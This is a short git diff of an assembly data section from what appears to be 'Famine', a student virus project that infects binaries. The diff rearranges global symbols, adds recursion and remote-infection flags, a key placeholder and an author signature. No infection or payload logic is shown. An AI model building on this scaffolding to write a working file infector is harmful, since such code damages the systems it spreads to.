@@ -1,20 +1,12 @@
 section .textstart
 global _infect
-global size
-global memaddr
-
-global virus_addr
-global virus_length
-
-global crypt_off
-global crypt_length
-
-global test_area
-global test_length
 
 global key
 
+global opt
+
 global environ
+
 extern entry
 extern decrypt
 
@@ -24,12 +16,17 @@ _infect:
 	jmp begin
 data:
 diff: db `00000000`
-virus_addr: db `00000000`
-virus_length: db `00000000`
-crypt_off: db `00000000`
-crypt_length: db `00000000`
+
+opt:
+is_recur: db `\0`
+is_remote: db `\0`
+
+aligner: db `000000`
+aligner2: db `00000000`
+
 key: db `0000000000000000`
 test_area: db `AAAAAAAAAAAAAAA`,0
+
 signature: db `Famine version 1.0 (c)oded by ndombre-agadhgad`,0
 
 environ: db `00000000`
